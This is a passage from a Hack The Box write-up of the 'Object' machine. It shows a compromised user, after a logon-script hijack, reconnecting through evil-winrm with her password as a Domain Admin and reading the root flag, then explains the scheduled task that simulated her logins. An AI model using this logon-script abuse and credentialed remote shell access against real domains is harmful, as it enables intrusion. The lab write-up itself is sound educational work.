+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 C:\\programdata\\cmd.ps1
+User profile
+Home directory
+Last logon                   2/28/2022 3:51:46 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Admins        *Domain Users
+The command completed successfully.
+</span></code></pre></div></div>
+<h3 id="winrm-with-domain-admin">WinRM with Domain Admin</h3>
+<p>The group will not be in my current session:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+</span><span class="go">
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+</span></code></pre></div></div>
+<p>But if I exit and reconnect, it will be:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="kr">exit</span><span class="w">
+</span><span class="go">
+Info: Exiting with code 0
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.11.132</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'W3llcr4ft3d_4cls'</span><span class="w">
+</span><span class="go">
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\maria\Documents&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
+</span><span class="go">
+GROUP INFORMATION
+-----------------
+
+Group Name                                    Type             SID                                           Attributes
+============================================= ================ ============================================= ===============================================================
+Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
+OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level          Label            S-1-16-12288
+</span></code></pre></div></div>
+<p>As an Administrator and Domain Admin, maria can now read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w">
+</span><span class="go">6cc13722************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="identify-automation">Identify Automation</h3>
+<p>I want to know how the automation works to simulate maria’s login activity. <code class="language-plaintext highlighter-rouge">Get-ScheduledTask</code> as an admin will show all the scheduled tasks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="n">get-scheduledtask</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">Disabled</span><span class="w">
+</span><span class="go">
+TaskPath                                       TaskName                          State
+--------                                       --------                          -----
+\                                              CreateExplorerShellUnelevatedTask Running
+\                                              dsacls                            Running
+\                                              Jenkins                           Ready
+\                                              RunLogOn                          Running
+\                                              User_Feed_Synchronization-{52F... Ready
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319    Ready  
+\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319 64 Ready
+\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Ready
+\Microsoft\Windows\AppID\                      EDP Policy Manager                Ready
+...[snip]...
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">RunLogOn</code> seems promising.</p>
+<p>I’ll save that task into a variable, and explore it a bit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="nv">$task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get-scheduledtask</span><span class="w"> </span><span class="nt">-taskname</span><span class="w"> </span><span class="nx">RunLogOn</span><span class="w">
+</span></code></pre></div></div>
+<p>The top level object doesn’t have much useful information, other than it looks to be constantly running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="nv">$task</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
+</span><span class="go">
+Actions            : {MSFT_TaskExecAction}
+Author             : OBJECT\administrator
+Date               : 2021-10-22T04:06:20.0065866
+Description        :
+Documentation      :
+Principal          : MSFT_TaskPrincipal2
+SecurityDescriptor :
+Settings           : MSFT_TaskSettings3
+Source             :
+State              : Running
+TaskName           : RunLogOn
+TaskPath           : \
+Triggers           : {MSFT_TaskLogonTrigger}
+URI                : \RunLogOn
+Version            :
+PSComputerName     :
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">$task.Actions.Execute</code> has the path to the script that is run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">Actions</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
+</span><span class="go">
+
+Id               :
+Arguments        :
+Execute          : C:\Users\maria\AppData\Roaming\LogonJob\run.bat
+WorkingDirectory :
+PSComputerName   :
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">$task.Principal.UserId</code> shows it will run as maria:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\&gt;</span><span class="w"> </span><span class="nv">$task</span><span class="o">.</span><span class="nf">Principal</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
+</span><span class="go">
+
+DisplayName         :
+GroupId             :
+Id                  : Author
+LogonType           : Password
+RunLevel            : Limited
+UserId              : maria
+ProcessTokenSidType : Default
+RequiredPrivilege   :
+PSComputerName      :
+</span></code></pre></div></div>
+<h3 id="runbat--dops1">run.bat / do.ps1</h3>
+<p>There are actually two files in the folder containing <code class="language-plaintext highlighter-rouge">run.bat</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\maria\appdata\roaming\logonjob&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+
+    Directory: C:\Users\maria\appdata\roaming\logonjob
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/22/2021   3:57 AM             82 do.ps1
+-a----       10/22/2021   4:03 AM            157 run.bat
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">run.bat</code> starts a loop where it runs the <code class="language-plaintext highlighter-rouge">do.ps1</code> script with PowerShell, then pings localhost 5 times, and the loops.</p>
+<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo <span class="na">off</span>
+
+<span class="nl">:LOOP</span>
+
+<span class="kd">START</span> <span class="na">/B </span><span class="kd">powershell</span> <span class="na">-ep </span><span class="kd">bypass</span> <span class="kd">C</span>:\Users\maria\Appdata\Roaming\LogonJob\do.ps1
+<span class="nb">ping</span> <span class="m">127</span>.0.0.1 <span class="na">-n </span><span class="m">5</span> <span class="o">&gt;</span> <span class="kr">nul</span>
+<span class="nb">cls</span>
+
+<span class="kd">GOTO</span> <span class="nl">:LOOP</span>
+
+<span class="nl">:EXIT</span>
+
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">ping</code> is often used as a sleep function in batch scripting because there is no sleep, and each ping takes about one second.</p>
+<p><code class="language-plaintext highlighter-rouge">do.ps1</code> is just two lines:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$path</span><span class="o">=</span><span class="p">(</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ScriptPath</span><span class="p">)</span><span class="o">.</span><span class="nf">ScriptPath</span><span class="w">
+</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nv">$path</span><span class="w">
+</span></code></pre></div></div>
+<p>It fetches the logon script associated with maria’s account, and runs it with PowerShell.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/02/28/htb-object.html"></a>
+</article>
